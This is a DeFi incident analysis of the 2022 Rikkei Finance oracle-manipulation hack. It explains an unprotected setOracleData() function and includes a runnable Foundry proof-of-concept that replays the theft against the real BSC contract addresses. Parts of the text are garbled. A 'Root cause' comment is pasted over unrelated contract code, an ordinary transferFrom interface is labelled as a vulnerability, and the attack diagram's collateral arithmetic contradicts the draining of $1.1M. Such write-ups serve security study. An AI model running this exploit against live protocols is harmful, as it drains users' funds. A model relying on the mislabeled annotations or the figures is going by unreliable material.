# Rikkei Finance — Oracle Manipulation Over-Collateralized Borrowing Analysis

| Field | Details |
|------|------|
| **Date** | 2022-04-15 |
| **Protocol** | Rikkei Finance |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$1,100,000 (USDC) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 16,956,474 |
| **Vulnerable Contract** | SimplePriceOracle [0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5](https://bscscan.com/address/0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5) |
| **Root Cause** | The `setOracleData()` function had no access control, allowing anyone to arbitrarily set the BNB price oracle, enabling the attacker to inflate collateral value and over-borrow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/Rikkei_exp.sol) |

---
## 1. Vulnerability Overview

Rikkei Finance is a BSC-based lending protocol that used the `SimplePriceOracle` contract as its price oracle. The oracle's `setOracleData()` function, which updates prices, had **absolutely no access control (onlyOwner, onlyAdmin, etc.)**.

The attacker executed the attack in the following steps:
1. Minted rBNB with a small amount of BNB (100 trillion wei = 0.0001 BNB)
2. Used `setOracleData()` to set the BNB price to an extremely high value
3. Borrowed the entire rUSDC balance using the inflated collateral value
4. Restored the oracle back to the original Chainlink feed (to cover tracks)

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable SimplePriceOracle.setOracleData() (actual bug)
contract SimplePriceOracle {
    mapping(address => address) public oracleData;

    // ❌ No access control — anyone can change the oracle price source
    function setOracleData(address token, address source) external {
        // No onlyOwner!
        oracleData[token] = source;
    }

    function getUnderlyingPrice(address cToken) external view returns (uint256) {
        address token = ICToken(cToken).underlying();
        address source = oracleData[token];
        // If source is a fake feed deployed by the attacker, arbitrary price can be returned
        return IPriceFeed(source).latestAnswer();
    }
}

// ✅ Correct pattern
contract SimplePriceOracleFixed {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    // ✅ Only owner can change oracle source
    function setOracleData(address token, address source) external onlyOwner {
        // ✅ Added: validate that source is a Chainlink-compatible feed
        require(source != address(0), "invalid source");
        // ✅ Added: timelock recommended
        oracleData[token] = source;
        emit OracleSet(token, source);
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**SimplePriceOracle.sol** — Entry point:
```solidity
// ❌ Root cause: `setOracleData()` function has no access control, allowing anyone to arbitrarily set the BNB price oracle, enabling the attacker to inflate collateral value and over-borrow
    function setOracleData(address rToken, oracleChainlink _oracle) external {  // ❌ Vulnerability
        oracleData[rToken] = _oracle;
    }
```

**RToken.sol** — Related contract:
```solidity
// ❌ Root cause: `setOracleData()` function has no access control, allowing anyone to arbitrarily set the BNB price oracle, enabling the attacker to inflate collateral value and over-borrow
    function initialize(CointrollerInterface cointroller_,
                        InterestRateModel interestRateModel_,
                        uint initialExchangeRateMantissa_,
                        string memory name_,
                        string memory symbol_,
                        uint8 decimals_) public {
        require(msg.sender == admin, "only admin may initialize the market");
        require(accrualBlockNumber == 0 && borrowIndex == 0, "market may only be initialized once");  // ❌ Initialization check

        // Set initial exchange rate
        initialExchangeRateMantissa = initialExchangeRateMantissa_;
        require(initialExchangeRateMantissa > 0, "initial exchange rate must be greater than zero.");

        // Set the cointroller
        uint err = _setCointroller(cointroller_);
        require(err == uint(Error.NO_ERROR), "setting cointroller failed");

        // Initialize block number and borrow index (block number mocks depend on cointroller being set)
        accrualBlockNumber = getBlockNumber();
        borrowIndex = mantissaOne;

        // Set the interest rate model (depends on block number / borrow index)
        err = _setInterestRateModelFresh(interestRateModel_);
        require(err == uint(Error.NO_ERROR), "setting interest rate model failed");

        name = name_;
        symbol = symbol_;
        decimals = decimals_;

        // The counter starts true to prevent changing it from zero to non-zero (i.e. smaller cost/refund)
        _notEntered = true;
    }
```

**EIP20NonStandardInterface.sol** — Related contract:
```solidity
// ❌ Root cause: `setOracleData()` function has no access control, allowing anyone to arbitrarily set the BNB price oracle, enabling the attacker to inflate collateral value and over-borrow
    function transfer(address dst, uint256 amount) external;

    ///
    /// !!!!!!!!!!!!!!
    /// !!! NOTICE !!! `transferFrom` does not return a value, in violation of the BEP-20 specification
    /// !!!!!!!!!!!!!!
    ///

    /**
      * @notice Transfer `amount` tokens from `src` to `dst`
      * @param src The address of the source account
      * @param dst The address of the destination account
      * @param amount The number of tokens to transfer
      */
    function transferFrom(address src, address dst, uint256 amount) external;  // ❌ Unauthorized transferFrom

    /**
      * @notice Approve `spender` to transfer up to `amount` from `src`
      * @dev This will overwrite the approval amount for `spender`
      *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)
      * @param spender The address of the account which may transfer tokens
      * @param amount The number of tokens that are approved
      * @return Whether or not the approval succeeded
      */
    function approve(address spender, uint256 amount) external returns (bool success);

    /**
      * @notice Get the current allowance from `owner` for `spender`
      * @param owner The address of the account which owns the tokens to be spent
      * @param spender The address of the account which may transfer tokens
      * @return The number of tokens allowed to be spent
      */
    function allowance(address owner, address spender) external view returns (uint256 remaining);

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Mint rBNB (small amount of BNB)
    │       BNB approve(rBNB)
    │       rBNB.mint(100,000,000,000,000 wei) // 0.0001 BNB
    │       Cointroller.enterMarkets([rBNB])
    │
    ├─[2] ⚡ Call setOracleData() (no access control)
    │       SimplePriceOracle.setOracleData(
    │           BNB_address,
    │           attacker's fake feed address  // 1 BNB = 1,000,000 USD
    │       )
    │       → BNB collateral value inflated infinitely
    │
    ├─[3] rUSDC.borrow(getCash())
    │       Collateral value = 0.0001 BNB × 1,000,000 USD/BNB = $100
    │       → Borrow entire USDC balance with inflated collateral succeeds
    │
    ├─[4] Call setOracleData() again
    │       Restore BNB oracle to original Chainlink address
    │       (cover tracks)
    │
    └─[5] Transfer stolen USDC
            Loss: ~$1,100,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IRToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface ICointroller {
    function enterMarkets(address[] calldata rTokens) external returns (uint256[] memory);
}

interface ISimplePriceOracle {
    // ⚡ Vulnerable function: no access control
    function setOracleData(address token, address source) external;
}

contract ContractTest is Test {
    IERC20 USDC  = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IRToken rBNB = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
    IRToken rUSDC = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);
    ICointroller comptroller =
        ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimplePriceOracle oracle =
        ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);

    // Actual Chainlink BNB/USD feed
    address chainlinkBnbFeed = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;
    address fakePriceFeed;    // Fake feed deployed by attacker

    function setUp() public {
        vm.createSelectFork("bsc", 16_956_474);
        // Deploy fake price feed (1 BNB = 1,000,000 USD)
        fakePriceFeed = address(new FakePriceFeed());
    }

    function testExploit() public {
        // [Step 1] Mint rBNB with small amount of BNB
        USDC.approve(address(rUSDC), type(uint256).max);
        rBNB.mint{value: 100_000_000_000_000}(100_000_000_000_000); // 0.0001 BNB

        // Register rBNB as collateral in Cointroller
        address[] memory markets = new address[](1);
        markets[0] = address(rBNB);
        comptroller.enterMarkets(markets);

        // [Step 2] ⚡ Oracle manipulation: replace with fake feed (no access control!)
        oracle.setOracleData(
            0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, // BNB address
            fakePriceFeed  // Fake feed returning 1 BNB = $1,000,000
        );

        // [Step 3] Borrow entire USDC balance using inflated collateral value
        uint256 borrowAmount = rUSDC.getCash();
        rUSDC.borrow(borrowAmount);

        emit log_named_decimal_uint("[Stolen] USDC", USDC.balanceOf(address(this)), 18);

        // [Step 4] Restore oracle (cover tracks)
        oracle.setOracleData(
            0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,
            chainlinkBnbFeed
        );
    }
}

// Fake price feed: returns 1 BNB = $1,000,000
contract FakePriceFeed {
    function latestAnswer() external pure returns (int256) {
        return 1_000_000 * 1e8; // $1,000,000 with 8 decimals
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Oracle Manipulation (Oracle Manipulation via Access Control) |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Unauthorized Price Oracle Modification |
| **Attack Vector** | Unauthorized `setOracleData()` call → collateral value inflation → over-borrowing |
| **Preconditions** | No access control on `setOracleData` |
| **Impact** | Entire lending pool assets can be drained |

---
## 6. Remediation Recommendations

1. **Mandatory Access Control**: Apply `onlyOwner` or `onlyAdmin` modifiers to all functions that modify oracle addresses/sources.
2. **Apply Timelock**: Apply a minimum 24–48 hour timelock to oracle changes so the community can detect abnormal modifications.
3. **Use Trusted Oracles**: Use verified decentralized oracles such as Chainlink and Pyth, and minimize custom oracle usage.
4. **Audit Function Visibility**: Before deployment, verify that all public/external admin functions have appropriate access controls.

---
## 7. Lessons Learned

- **Access Control Basics**: This could have been prevented by adding a single `onlyOwner` modifier to `setOracleData()`. It is the most fundamental mistake possible.
- **Oracle Security**: Price oracles are a core trust component of DeFi protocols. Oracle access control must never be neglected.
- **$1.1M Loss**: While a small-scale attack, the same pattern can be applied to larger protocols.
- **Covering Tracks**: Restoring the oracle after the attack was the attacker's attempt to hinder forensic investigation.